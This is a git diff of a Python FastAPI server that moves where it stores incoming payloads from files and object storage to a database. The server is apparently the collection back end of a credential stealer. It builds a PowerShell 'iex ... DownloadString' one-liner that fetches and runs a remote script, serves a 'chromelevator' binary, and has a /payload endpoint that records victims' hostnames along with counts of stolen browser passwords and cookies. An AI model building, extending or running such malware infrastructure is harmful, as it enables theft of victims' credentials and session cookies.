@@ -1,7 +1,6 @@
 import json
 import logging
 import os
-from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
 
@@ -11,7 +10,7 @@ from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
 from starlette.exceptions import HTTPException as StarletteHTTPException
 from starlette.responses import Response
 
-from app.storage import upload_json_safe, verify_storage_connection
+from app.repository import save_payload_record, verify_database_connection
 
 logger = logging.getLogger(__name__)
 
@@ -24,15 +23,15 @@ app = FastAPI(
 
 
 @app.on_event("startup")
-async def startup_verify_storage() -> None:
+async def startup_verify_database() -> None:
     try:
-        verify_storage_connection()
+        verify_database_connection()
+        logger.info("Database connection OK")
     except Exception:
-        logger.exception("Storage connection failed at startup")
+        logger.exception("Database connection failed at startup")
 
 SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
 BIN_DIR = Path(__file__).with_name("bin")
-DATA_DIR = Path(os.getenv("DATA_DIR", "/app/data"))
 
 EMPTY = Response(status_code=404, content=b"")
 
@@ -78,30 +77,8 @@ def build_powershell_command(api_base: str | None = None) -> str:
     return f"iex (New-Object Net.WebClient).DownloadString('{base}/windows-script')"
 
 
-def save_payload(payload: dict[str, Any]) -> dict[str, str]:
-    DATA_DIR.mkdir(parents=True, exist_ok=True)
-
-    timestamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
-    hostname = payload.get("hostname", "unknown")
-    safe_hostname = "".join(char if char.isalnum() or char in "-_" else "_" for char in hostname)
-    filename = f"{timestamp}_{safe_hostname}.json"
-    body = json.dumps(payload, indent=2)
-
-    json_path = DATA_DIR / filename
-    json_path.write_text(body, encoding="utf-8")
-
-    result: dict[str, str] = {"json": str(json_path)}
-
-    storage_result, storage_error = upload_json_safe(filename, hostname, body)
-    if storage_result:
-        result["storage_backend"] = storage_result["backend"]
-        result["storage_uri"] = storage_result["uri"]
-        result["storage_key"] = storage_result["key"]
-        result["storage_bucket"] = storage_result["bucket"]
-    elif storage_error:
-        result["storage_error"] = storage_error
-
-    return result
+def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
+    return save_payload_record(payload)
 
 
 def render_windows_script() -> str:
@@ -205,7 +182,7 @@ async def get_chromelevator(arch: str = "x64"):
 @app.post("/payload")
 async def receive_payload(request: Request) -> dict[str, Any]:
     payload = await request.json()
-    saved_files = save_payload(payload)
+    saved = save_payload(payload)
 
     chromelevator = payload.get("chromelevator") if isinstance(payload.get("chromelevator"), dict) else {}
 
@@ -214,7 +191,7 @@ async def receive_payload(request: Request) -> dict[str, Any]:
         "password_count": payload.get("passwordCount", 0),
         "cookie_count": payload.get("cookieCount", 0),
         "chromelevator": chromelevator,
-        "saved_files": saved_files,
+        "saved": saved,
     }
 
 
